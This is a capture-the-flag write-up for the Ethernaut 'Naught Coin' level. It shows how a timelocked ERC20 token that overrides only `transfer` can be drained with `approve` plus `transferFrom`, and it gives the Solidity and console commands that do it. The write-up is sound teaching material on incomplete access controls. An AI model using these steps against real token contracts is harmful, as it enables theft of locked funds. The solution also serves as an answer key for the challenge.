# 15. Naught Coin
<sup>Difficulty 5/10</sup>

NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.

Things that might help

- The [ERC20](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md) Spec
- The [OpenZeppelin](https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contracts) codebase


## Solution

We need to transfer all of our token to another address. To do so, we cannot use `transfer` method as it is override in the contract:

```solidity
function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
  super.transfer(_to, _value);
}

// Prevent the initial owner from transferring tokens until the timelock has passed
modifier lockTokens() {
  if (msg.sender == player) {
    require(now > timeLock);
    _;
  } else {
   _;
  }
} 
```

Nonetheless, `transfer` function is not the only method a user can use to move his token. Another available function to transfer token is `transferFrom`:

```solidity
function transferFrom(
    address from,
    address to,
    uint256 amount
) public virtual override returns (bool) {
    address spender = _msgSender();
    _spendAllowance(from, spender, amount);
    _transfer(from, to, amount);
    return true;
}
```

We create and deploy a contract with Remix IDE:

```solidity
//SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Receiver {
    receive() payable external {

    }
}
```

```javascript
const amount = (await contract.balanceOf(player)).toString()
// -> '1000000000000000000000000'
const receiver = '0x4e5Eb57187adE87d1c2A55e62CA27f269379ffC6'  // Remix contract
await contract.approve(player, amount)
await contract.transferFrom(player, receiver, amount)
(await contract.balanceOf(player)).toString()
'0'
```

## OZ Corner

When using code that's not your own, it's a good idea to familiarize yourself with it to get a good understanding of how everything fits together. This can be particularly important when there are multiple levels of imports (your imports have imports) or when you are implementing authorization controls, e.g. when you're allowing or disallowing people from doing things. In this example, a developer might scan through the code and think that `transfer` is the only way to move tokens around, low and behold there are other ways of performing the same operation with a different implementation.

